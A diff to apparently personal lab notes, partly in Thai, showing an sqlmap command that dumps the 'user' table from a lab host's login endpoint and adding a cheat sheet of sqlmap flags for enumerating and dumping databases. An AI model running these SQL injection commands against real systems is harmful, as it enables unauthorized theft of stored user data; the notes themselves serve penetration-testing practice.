@@ -15,3 +15,12 @@ sqlmap -u "http://10.10.212.122/ai/includes/user_login?email=fsgdf&password=sdas
 ```bash
 sqlmap -u "http://10.10.212.122/ai/includes/user_login?email=fsgdf&password=sdasaf" -D ai -T user --dump
 ```
+# Syntax
+- -u url
+- --dbs เทส playload หา database
+- --tables เทส playload หา table
+- -D Database
+- -T table
+- -dump ดึงออกมา
+- -r อ่านไฟล์ request
+- -p กำหนดว่าจะเทส playload ตรงไหน
